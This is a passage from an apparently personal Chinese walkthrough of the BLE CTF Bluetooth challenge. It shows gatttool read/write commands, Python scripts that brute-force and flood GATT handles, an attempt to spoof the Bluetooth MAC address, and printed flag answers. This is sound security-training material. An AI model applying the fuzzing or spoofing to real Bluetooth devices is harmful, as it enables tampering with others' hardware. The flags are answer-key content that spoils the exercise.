指定远程蓝牙设备的mac地址 --char-read: 读取Characteristics的Value/Descriptor --char-write-req: 写Characteristics的Value/Descriptor，会往对端发送请求 -a： 上面读写命令的参数之一，指定handle -n: 写 characteristic 的值，写操作需要的，读操作没有这个参数。 ztree@ubuntu2:~/bt/ble_ctf$ gatttool -h Usage: gatttool [OPTION?] Help Options: -h, --help Show help options --help-all Show all help options --help-gatt Show all GATT commands --help-params Show all Primary Services/Characteristics arguments --help-char-read-write Show all Characteristics Value/Descriptor Read/Write arguments Application Options: -i, --adapter=hciX Specify local adapter interface -b, --device=MAC Specify remote Bluetooth address -t, --addr-type=[public | random] Set LE address type. Default: public -m, --mtu=MTU Specify the MTU size -p, --psm=PSM Specify the PSM for GATT/ATT over BR/EDR -l, --sec-level=[low | medium | high] Set security level. Default: low -I, --interactive Use interactive mode 查看gatt有哪些命令： ztree@ubuntu2:~/bt/ble_ctf$ gatttool --help-gatt Usage: gatttool [OPTION?] GATT commands --primary Primary Service Discovery --characteristics Characteristics Discovery --char-read Characteristics Value/Descriptor Read --char-write Characteristics Value Write Without Response (Write Command) --char-write-req Characteristics Value Write (Write Request) --char-desc Characteristics Descriptor Discovery --listen Listen for notifications and indications -I, --interactive Use interactive mode 查看gatt读/写Characteristics Value/Descriptor 命令的参数 ztree@ubuntu2:~/bt/ble_ctf$ gatttool --help-char-read-write Usage: gatttool [OPTION?] Characteristics Value/Descriptor Read/Write arguments -a, --handle=0x0001 Read/Write characteristic by handle(required) -n, --value=0x0001 Write characteristic value (required for write operation) Flag 0x002e Description Learn how to read handles Hint Check out the ascii value of handle 0x002e and submit it to the flag submision handle 0x002c. If you are using gatttool, make sure you convert it to hex with xxd. If you are using bleah, you can send it as a string value. handle 对于GATT Server来说，句柄是什么?GATT服务器上的每个attribute都有一个16位标识符，称为其句柄。句柄使得attribute可寻址（addressable），可以将其视为GATT Server上指向attribute位置的指针。在连接期间，以及连接期间进行绑定设备时，句柄都不会更改。 # 1、从handle 0x002e读取值 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002e|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' d205303e099ceff44835 # 2、提交flag ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;d205303e099ceff44835&quot;|xxd -ps) Characteristic value was written successfully # 3、读取分数 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:2 /20 Flag 0x0030 Description Read handle puzzle fun Hint Check out the ascii value of handle 0x0030. Do what it tells you and submit the flag you find to 0x002c. # 1、读取handle 0x0030的值 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0030|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' MD5 of Device Name # 2、按照提示，md5,并取前20个字符（获取分数失败后，观察到前面两题的flag的长度都是20） ztree@ubuntu2:~$ echo -n &quot;BLECTF&quot; | md5sum | cut -b 1-20 5cd56d74049ae40f442e # 3、提交flag ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;5cd56d74049ae40f442e&quot;|xxd -ps) Characteristic value was written successfully # 4、查看分数 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:3 /20 Flag 0x0016 Description Learn about discoverable device attributes Hint Bluetooth GATT services provide some extra device attributes. Try finding the value of the Generic Access -&gt; Device Name. # 1、读取handle 0x0016的值 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0016|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' 2b00042f7481c7b056c4b410d28f33cf # 2、取前20个字符 ztree@ubuntu2:~$ echo -n &quot;2b00042f7481c7b056c4b410d28f33cf&quot; | cut -b 1-20 2b00042f7481c7b056c4 # 3、提交flag ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;2b00042f7481c7b056c4&quot;|xxd -ps) Characteristic value was written successfully # 4、查看分数 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:4 /20 Hint啥意思？Generic Access -&gt; Device Name在哪？？？ Flag 0x0032 Description Learn about reading and writing to handles Hint Read handle 0032 and do what it says. Notice that its not telling you to write to the flag handle as you have been. When you find the flag, go ahead and write it to the flag handle you have used in the past flags. # 1、读，让我随便写东西 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0032|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Write anything here # 2、那就随便写 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0032 -n $(echo -n &quot;testtest&quot;|xxd -ps) Characteristic value was written successfully # 3、再次读0x0032 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0032|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' 3873c0270763568cf7aa # 4、提交flag ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;3873c0270763568cf7aa&quot;|xxd -ps) Characteristic value was written successfully # 5、查看分数 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:5 /20 Flag 0x0034 Description Learn about reading and writing ascii to handles Hint Follow the instructions found from reading handle 0x0034. Keep in mind that some tools only write hex values while other provide methods for writing either hex or ascii ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0034|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Write the ascii value &quot;yo&quot; here ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0034 -n $(echo -n &quot;yo&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0034|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' c55c6314b3db0a6128af ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;c55c6314b3db0a6128af&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:6 /20 Flag 0x0036 Description Learn about reading and writing hex to handles Hint Follow the instructions found from reading handle 0x0036. Keep in mind that some tools only write hex values while other provide methods for writing either hex or ascii ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0036|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Write the hex value 0x07 here ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0036 -n 7 Invalid value ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0036 -n 07 Characteristic value was written successfully ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0036|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' 1179080b29f8da16ad66 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;1179080b29f8da16ad66&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:7 /20 Flag 0x0038 Description Learn about reading and writing to handles differently Hint Follow the instructions found from reading handle 0x0038. Pay attention to handles here. Keep in mind handles can be refrenced by integer or hex. Most tools such as gatttool and bleah allow you to specify handles both ways. ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0038|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Write 0xC9 to handle 58 ztree@ubuntu2:~$ echo &quot;obase=16;58&quot; | bc 3A ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x003A -n 0x00c9 Characteristic value was written successfully ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0038|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Write 0xC9 to handle 58 ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x003A -n c9 Characteristic value was written successfully ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0038|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' f8b136d937fad6a2be9f ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;f8b136d937fad6a2be9f&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:8 /20 Flag 0x003c Description Learn about write fuzzing Hint Take a look at handle 0x003c and do what it says. You should script up a solution for this one. Also keep in mind that some tools write faster than others. # solution0x3c.py import os import time for i in range(256): value = str(hex(i))[2:] value = value.zfill(2) command = &quot;gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x003c -n &quot;+value print(command) time.sleep(0.1) os.system(command) ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x003c|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Brute force my value 00 to ff ztree@ubuntu2:~/bt/ble_ctf/solutions$ python solution0x3c.py gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x003c -n 00 Characteristic value was written successfully gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x003c -n 01 Characteristic value was written successfully ...... gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x003c -n ff Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x003c|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' 933c1fcfa8ed52d2ec05 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;933c1fcfa8ed52d2ec05&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:9 /20 Flag 0x003e Description Learn about read and write speeds Hint Talke a look at handle 0x003e and do what it says. Keep in mind that some tools have better connection speeds than other for doing reads and writes. This has to do with the functionality the tool provides or how it uses cached BT connections on the host OS. Try testing different tools for this flag. Once you find the fastest one, whip up a script or bash 1 liner to complete the task. FYI, once running, this task takes roughly 90 seconds to complete if done right. import os import time for i in range(1000): command = &quot;gatttool -b C0:49:EF:66:26:DE --char-read -a 0x003e&quot; print(&quot;[&quot;+str(i)+&quot;]&quot;+command) time.sleep(0.1) os.system(command) ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x003e|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Read me 1000 times ztree@ubuntu2:~/bt/ble_ctf/solutions$ cp solution0x3c.py solution0x3e.py ztree@ubuntu2:~/bt/ble_ctf/solutions$ vim solution0x3e.py ztree@ubuntu2:~/bt/ble_ctf/solutions$ python solution0x3e.py [0]gatttool -b C0:49:EF:66:26:DE --char-read -a 0x003e ...... [999]gatttool -b C0:49:EF:66:26:DE --char-read -a 0x003e Characteristic value/descriptor: 36 66 66 63 64 32 31 34 66 66 65 62 64 63 30 64 30 36 39 65 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x003e|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' 6ffcd214ffebdc0d069e ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;6ffcd214ffebdc0d069e&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:10/20 Flag 0x0040 Description Learn about single response notifications Hint Check out handle 0x0040 and google search gatt notify. Some tools like gatttool have the ability to subscribe to gatt notifications ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0040 -n 00 --listen Characteristic value was written successfully Notification handle = 0x0040 value: 35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62 ^C ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo &quot;35 65 63 33 37 37 32 62 63 64 30 30 63 66 30 36 64 38 65 62&quot; | xxd -r -p;printf '\\n' 5ec3772bcd00cf06d8eb ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;5ec3772bcd00cf06d8eb&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:11/20 Flag 0x0042 Description Learn about single response indicate Hint Check out handle 0x0042 and google search gatt indicate. For single response indicate messages, like this challenge, tools such as gatttool will work just fine. ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0042|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Listen to handle 0x0044 for a single indication ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0044 -n 00 --listen Characteristic value was written successfully Indication handle = 0x0044 value: 63 37 62 38 36 64 64 31 32 31 38 34 38 63 37 37 63 31 31 33 ^C ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo &quot;63 37 62 38 36 64 64 31 32 31 38 34 38 63 37 37 63 31 31 33&quot; | xxd -r -p;printf '\\n' c7b86dd121848c77c113 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;c7b86dd121848c77c113&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:12/20 Flag 0x0046 Description Learn about multi response notifications Hint Check out handle 0x0046 and do what it says. Keep in mind that this notification clallange requires you to recieve multiple responses in order to complete. ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0046|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Listen to me for multi notifications ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0046 -n 00 --listen Characteristic value was written successfully Notification handle = 0x0046 value: 55 20 6e 6f 20 77 61 6e 74 20 74 68 69 73 20 6d 73 67 00 00 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 Notification handle = 0x0046 value: 63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64 ^C ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo &quot;63 39 34 35 37 64 65 35 66 64 38 63 61 66 65 33 34 39 66 64&quot; | xxd -r -p;printf '\\n' c9457de5fd8cafe349fd ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;c9457de5fd8cafe349fd&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:13/20 Gatt Indication和 Gatt Notification的区别 Gatt Indications 和 Gatt Notifications 是 BLE 中的两种不同的数据交互方式，用于在设备之间传输数据。 Gatt Indication：是一种双向的数据传输方式，更可靠和安全。 发送方发送数据后，接收方必须回复一个确认消息，以确认数据是否正确接收。 数据传输速度较慢，因为必须等待接收方的确认消息。 用于需要确保数据准确传输的关键应用场景，如固件升级。 Gatt Notification：是一种单向的数据传输方式。 发送方发送数据后，不需要接收方回复任何确认消息。 数据传输速度快，因为没有等待确认消息的时间延迟。 用于不需要确认的实时数据传输应用场景，如传感器数据。 综上所述，Gatt Indications 和 Gatt Notifications之间的主要区别在于数据传输的可靠性和速度。Gatt Indication 更可靠但速度较慢，而Gatt Notification 速度较快但可靠性较低。具体使用哪种方式取决于应用场景的需求。某种程度上，Indication像TCP，Notification像UDP Flag 0x0048 Description Learn about multi response indicate Hint Check out handle 0x0042 （写错了，应该是48）and google search gatt indicate. Keep in mind that this chalange will require you to parse multiple indicate responses in order to complete the chalange. ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0048|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Listen to handle 0x004a for multi indications ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x004a -n 00 --listen Characteristic value was written successfully Indication handle = 0x004a value: 55 20 6e 6f 20 77 61 6e 74 20 74 68 69 73 20 6d 73 67 00 00 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 Indication handle = 0x004a value: 62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61 ^C ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo &quot;62 36 66 33 61 34 37 66 32 30 37 64 33 38 65 31 36 66 66 61&quot; | xxd -r -p;printf '\\n' b6f3a47f207d38e16ffa ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;b6f3a47f207d38e16ffa&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:14/20 Flag 0x004c Description Learn about BT client device attributes Hint Check out handle 0x004c and do what it says. Much like ethernet or wifi devices, you can also change your bluetooth devices mac address. ztree@ubuntu2:~/tools$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x004c|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Connect with BT MAC address 11:22:33:44:55:66 让以11:22:33:44:55:66为mac地址的设备去连接esp32，那就尝试修改mac，在Ubuntu22和16上试过了bdaddr工具，都不行。 ztree@ubuntu2:~/tools/bdaddr$ hciconfig -a hci0: Type: Primary Bus: USB BD Address: A8:93:4A:6F:31:2E ACL MTU: 1021:6 SCO MTU: 240:8 UP RUNNING RX bytes:16891 acl:4 sco:0 events:2239 errors:0 TX bytes:539081 acl:4 sco:0 commands:2228 errors:0 Features: 0xbf 0x3e 0x8d 0xfe 0xdb 0xff 0x7b 0x87 Packet type: DM1 DM3 DM5 DH1 DH3 DH5 HV1 HV2 HV3 Link policy: RSWITCH SNIFF Link mode: PERIPHERAL ACCEPT Name: 'BlueZ 5.64' Class: 0x6c010c Service Classes: Rendering, Capturing, Audio, Telephony Device Class: Computer, Laptop HCI Version: 5.2 (0xb) Revision: 0x915 LMP Version: 5.2 (0xb) Subversion: 0x2202 Manufacturer: MediaTek, Inc. (70) # 可看到修改失败 ztree@ubuntu2:~/tools/bdaddr$ ./bdaddr -i hci0 11:22:33:44:55:66 Manufacturer: MediaTek, Inc. (70) Device address: A8:93:4A:6F:31:2E Unsupported manufacturer ztree@ubuntu2:~/tools/bdaddr$ hciconfig hci0: Type: Primary Bus: USB BD Address: A8:93:4A:6F:31:2E ACL MTU: 1021:6 SCO MTU: 240:8 UP RUNNING RX bytes:17182 acl:4 sco:0 events:2243 errors:0 TX bytes:539093 acl:4 sco:0 commands:2232 errors:0 放弃，直接填答案： ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;aca16920583e42bdcf5f&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:15/20 Flag 0x004e Description Learn about message sizes MTU Hint Read handle 0x0048 and do what it says. Setting MTU can be a tricky thing. Some tools may provide mtu flags, but they dont seem to really trigger MTU negotiations on servers. Try using gatttool's interactive mode for this task. By default, the BLECTF server is set to force an MTU size of 20. The server will listen for MTU negotiations, and look at them, but we dont really change the MTU in the code. We just trigger the flag code if you trigger an MTU event with the value specified in handle 0x0048. GLHF! ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x004e|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Set your connection MTU to 444 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x004e --mtu=444 |awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Set your connection MTU to 444 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x004e -n 00 --mtu=444 |awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x004e -n 00 --mtu=444 Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x004e |awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' # 无效，进交互模式 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE -I [C0:49:EF:66:26:DE][LE]&gt; mtu 444 Command Failed: Disconnected [C0:49:EF:66:26:DE][LE]&gt; connect Attempting to connect to C0:49:EF:66:26:DE Connection successful [C0:49:EF:66:26:DE][LE]&gt; mtu 444 MTU was exchanged successfully: 444 [C0:49:EF:66:26:DE][LE]&gt; exit (gatttool:36338): GLib-WARNING **: 06:54:43.851: Invalid file descriptor. ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x004e |awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' b1e409e5a4eaf9fe5158 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;b1e409e5a4eaf9fe5158&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:16/20 Flag 0x0050 Description Learn about write responses Hint Check out handle 0x0050 and do what it says. This chalange differs from other write chalanges as your tool that does the write needs to have write response ack messages implemente correctly. This flag is also tricky as the flag will come back as notification response data even though there is no &quot;NOTIFY&quot; property. ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0050|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Write+resp 'hello' ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0050 -n $(echo -n &quot;hello&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0050|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' d41d8cd98f00b204e980 ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;d41d8cd98f00b204e980&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:17/20 Flag 0x0052 Description Hidden notify property Hint Take a look at handle 0x0052. Notice it does not have a notify property. Do a write here and listen for notifications anyways! Things are not always what they seem! ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0052|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' No notifications here! really? ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0052 -n $(echo -n &quot;hello&quot;|xxd -ps) --listen Characteristic value was written successfully Notification handle = 0x0052 value: 66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62 ^C ztree@ubuntu2:~/bt/ble_ctf/solutions$ echo &quot;66 63 39 32 30 63 36 38 62 36 30 30 36 31 36 39 34 37 37 62&quot; | xxd -r -p;printf '\\n' fc920c68b6006169477b ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x002c -n $(echo -n &quot;fc920c68b6006169477b&quot;|xxd -ps) Characteristic value was written successfully ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x002a|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' Score:18/20 Flag 0x0054 Description Use multiple handle properties Hint Check out all of the handle properties on 0x0054! Poke around with all of them and find pieces to your flag. ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-read -a 0x0054|awk -F':' '{print $2}'|tr -d ' '|xxd -r -p;printf '\\n' So many properties! ztree@ubuntu2:~/bt/ble_ctf/solutions$ gatttool -b C0:49:EF:66:26:DE --char-write-req -a 0x0054 -n $(echo -n &quot;hello&quot;|xxd -ps) --listen Characteristic value was written successfully Notification handle = 0x0054 value: 30 37 65 34 61 30 63 63 34 38 ^C 